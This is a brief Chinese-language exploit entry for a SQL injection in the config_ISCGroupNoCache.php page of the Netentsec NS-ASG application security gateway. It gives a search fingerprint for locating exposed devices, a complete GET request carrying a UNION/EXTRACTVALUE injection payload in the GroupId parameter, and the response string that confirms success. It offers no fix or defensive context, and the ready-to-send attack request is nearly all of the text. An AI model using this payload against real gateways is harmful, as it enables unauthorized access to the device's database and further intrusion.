# 网康科技NS-ASG应用安全网关config_ISCGroupNoCache.phpSQL注入漏洞

网康科技NS-ASG应用安全网关config_ISCGroupNoCache.php ｜ SQL注入 ｜ —
- **指纹**：`app="网康科技-NS-ASG安全网关"`
- **请求**：`GET /admin/config_ISCGroupNoCache.php?GroupId=1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+md5(666)),0x7e)) HTTP/1.1`
- **响应特征**：200 c728867a567e8